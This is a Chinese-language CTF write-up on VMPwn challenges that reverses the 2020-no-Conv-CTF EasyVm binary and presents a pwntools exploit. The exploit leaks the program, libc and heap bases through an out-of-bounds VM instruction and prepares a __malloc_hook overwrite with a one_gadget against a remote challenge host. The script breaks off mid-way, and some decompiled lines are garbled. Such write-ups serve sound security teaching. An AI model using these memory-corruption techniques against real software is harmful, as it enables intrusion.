# VMPwn之温故知新
## 前言
VMPwn泛指实现一些运算指令来模拟程序运行的Pwn题。去年十二月的时候跟着`0xC4m3l`师傅的文章系统学习了一下VMPwn，到今天发现VMPwn已经成了一个主流的出题方向，在去年的上海大学生网络安全大赛和红帽杯的线下也有几道VMPwn，因此我这里拿几道最近的题目来总结一下此类问题的一般思路。
## 题目概述
我们现在常见到的VMPwn基本设计如下：
  1. 分配内存模拟程序执行，基本组成要素为代码区和数据区，这两块区域可以分配在同一块内存或者两块独立内存。
  2. 数据区域包含模拟栈和模拟寄存器。
  3. 代码区根据用户指令模拟各种操作，如压栈出栈，寄存器立即数运算等
  4. 一般都是数据区的读写越界引发的漏洞，根据数据区内存分配位置的不同可以分为栈越界，bss越界和堆越界三类问题。
典型的题目有ciscn_2019_virtual、Ogeek_ovm、D3CTF_babyrop等。除了这种在机器码层面模拟程序执行的题目，还有模拟运行高级语言代码的题目，二者侧重点不太一样，我们分别拿例题来讲解。
## 汇编类VMPwn
这类问题的核心就是逆向，漏洞多是越界读写，先分析VM接收的数据格式，之后通过静态代码分析和动态调试搞清每条模拟指令的含义，再根据指令进行组合利用漏洞。
### 2020-no-Conv-CTF_EasyVm
#### 程序逻辑
在逆指令前，可以通过IDA的结构体导入功能导入C语言形式的结构体，简化代码。经过分析，核心的数据结构是这样一个node结构体。
    struct node{
        unsigned int reg[6];
        unsigned int chunk1;
        unsigned int chunk2;
        unsigned int memchunk;
        unsigned int res2;
        unsigned int chunk_addr;
    };
首先是main函数的代码，大的功能是分配一块区域供用户写指令和数据，将这块内存作为参数交与VM虚拟机执行，释放堆内存以及给一个present。
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      void *buf; // ST2C_4
      node *ptr; // [esp+18h] [ebp-18h]
      int bss_addr; // [esp+ACh] [ebp+7Ch]
      Init();
      ptr = SetInit();
      while ( 1 )
      {
        switch ( menu() )
        {
          case 1:
            buf = malloc(0x300u);                   // produce
            read(0, buf, 0x2FFu);
            ptr->mem_chunk = (unsigned int)buf;
            break;
          case 2:                                   // start
            if ( !ptr )
              exit(0);
            MainMethod(ptr);
            break;
          case 3:
            if ( !ptr )
              exit(0);
            free((void *)ptr->chunk_addr);          // Recycle,double free
            free(ptr);
            break;
          case 4:
            puts("Maybe a bug is a gif?");
            some_bss_val = bss_addr;                // 这里需要调试看到这个值
            ptr->mem_chunk = (unsigned int)&unk_3020;
            break;
          case 5:
            puts("Zzzzzz........");
            exit(0);
            return;
          default:
            puts("Are you kidding me ?");
            break;
        }
      }
    }
MainMethod函数实现的指令比较多，我们截取漏洞利用用到的，其他的指令还有`add,sub,sub,mul,div,xor,>>,chunk1)`。
0x54指令调用getchar函数向`ptr_chunk->reg[3]`存储的地址里输入值。
0x9指令将我们main函数中获取的present赋值给`ptr_chunk->reg[1]`，配合指令0x11可以将这个值输出。
    unsigned int __cdecl MainMethod(node *ptr_chunk)
    {   //...
        if ( *(_BYTE *)ptr_chunk->mem_chunk == 0x80u )
        {
          ptr_chunk->reg[Magic(ptr_chunk, 1u)] = *(_DWORD *)(ptr_chunk->mem_chunk + 2);// magic here,prt_chunk[可控idx] = 可控数字
          ptr_chunk->mem_chunk += 6;
        }
        if ( *(_BYTE *)ptr_chunk->mem_chunk == 0x53 )// leak
            {
            putchar(*(char *)ptr_chunk->reg[3]);      // 改为got表
            ptr_chunk->mem_chunk += 2;
            }
        if ( *(_BYTE *)ptr_chunk->mem_chunk == 0x76 )
            {
            ptr_chunk->reg[3] = *(_DWORD *)ptr_chunk->chunk1;// set val
            *(_DWORD *)ptr_chunk->chunk1 = 0;
            ptr_chunk->chunk1 += 4;
            ptr_chunk->mem_chunk += 5;
            }
        if ( *(_BYTE *)ptr_chunk->mem_chunk == 0x54 )// get input；get shell
            {
            v1 = (_BYTE *)ptr_chunk->reg[3];
            *v1 = getchar();
            ptr_chunk->mem_chunk += 2;
            }
        if ( *(_BYTE *)ptr_chunk->mem_chunk == 9 )
            {
            ptr_chunk->reg[1] = some_bss_val;         // set bss addr
            ++ptr_chunk->mem_chunk;
            }
        if ( *(_BYTE *)ptr_chunk->mem_chunk == 0x11 )// leak proc base
            {
            printf("%p\n", ptr_chunk->reg[1]);
            ++ptr_chunk->mem_chunk;
            }
        //...
    }
    int __cdecl Magic(node *ptr_chunk, unsigned int one)
    {
      int result; // eax
      unsigned int v3; // [esp+1Ch] [ebp-Ch]
      v3 = __readgsdword(0x14u);
      result = 0;
      if ( one reg + (_DWORD)(&free_ptr - 0xBE7)) + one);
      if ( __readgsdword(0x14u) != v3 )
        chk_fail();
      return result;
    }
#### 漏洞利用
这里的漏洞就是0x80指令的越界问题，以及main函数中清空堆块时的double free，还有出题人留的一个present。
我们首先用gdb调试查看所谓的present，发现是一个bss地址，因此使用`0x9+0x11`可以泄露程序加载基址`proc_base`。
有了基址我们使用`0x80`指令将`reg[3]`改为`puts@got`，配合`0x53`的单字节打印分4次输出得到puts函数地址从而得到libc基址。
泄露heap地址也同理，我们用`0x80`指令将`reg[3]`改成`main_arena->bins[]`中的`smallbin`的存储地址，再调用`0x53`指令输出得到heap基址。
最后Getshell需要`0x80+0x76+0x54`，我们在堆上写一个`__malloc_hook`地址，通过0x80指令将`ptr_chunk->chunk1`改成存储`__malloc_hook`的堆地址，`0x76指令`则将这个地址赋值给`reg[3]`，而`0x54`指令可以单字节向`__malloc_hook`输入值，我们分4次写入`one_gadget`即可。
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='i386',os='linux',log_level='debug')
    context.terminal = ['tmux','split','-h']
    debug = 0
    elf = ELF('./EasyVM')
    libc_offset = 0x3c4b20
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
    if debug:
        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        p = process('./EasyVM')
    else:
        libc = ELF('./libc-2.23.so')
        p = remote('121.36.215.224',9999)
    def Add(content):
        p.recvuntil('>>>')
        p.sendline('1')
        sleep(0.02)
        p.send(content)
    def Start():
        p.recvuntil('>>>')
        p.sendline('2')
    def Delete():
        p.recvuntil('>>>')
        p.sendline('3')
    def Gift():
        p.recvuntil('>>>')
        p.sendline('4')
    def exp():
        #leak proc base
        Gift()
        data = p8(0x9)+p8(0x11)+p8(0x99)
        Add(data)
        Start()
        p.recvuntil("0x")
        code_base = int(p.recvn(8),16) - (0x565556c0-0x56555000)
        log.success("code base => " + hex(code_base))
        #leak libc
        Delete()
        data = p8(0x80)+p8(0x3)+p32(code_base+0x0002fd0)+p8(0x53)+'\x00'
        data += p8(0x80)+p8(0x3)+p32(code_base+0x0002fd1)+p8(0x53)+'\x00'
        data += p8(0x80)+p8(0x3)+p32(code_base+0x0002fd2)+p8(0x53)+'\x00'
        data += p8(0x80)+p8(0x3)+p32(code_base+0x0002fd3)+p8(0x53)+'\x00'
        data += '\x99'
        Add(data)
        Start()
        p.recvn(2)
        libc_base = u32(p.recvn(4)) - libc.sym['puts']
        log.success("libc base => " + hex(libc_base))
        #leak heap
        target = libc_base + (0xf7fb2150-0xf7e00000)
        malloc = libc_base + libc.sym['__malloc_hook']
        shell = libc_base + gadgets[1]
        data = p8(0x80)+p8(0x3)+p32(target)+p8(0x53)+'\x00'
        data += p8(0x80)+p8(0x3)+p32(target+1)+p8(0x53)+'\x00'
        data += p8(0x80)+p8(0x3)+p32(target+2)+p8(0x53)+'\x00'
        data += p8(0x80)+p8(0x3)+p32(target+3)+p8(0x53)+'\x00'
        data += '\x99'
        Add(data)
        Start()
        p.recvn(2)
        heap_base = u32(p.recvn(4))
        log.success("heap base => " + hex(heap_base))
        #get shell
        fake_heap = heap_base + (0x56559aaf-0x56559000)
        fake_heap1 = heap_base + (0x56559abc-0x56559000)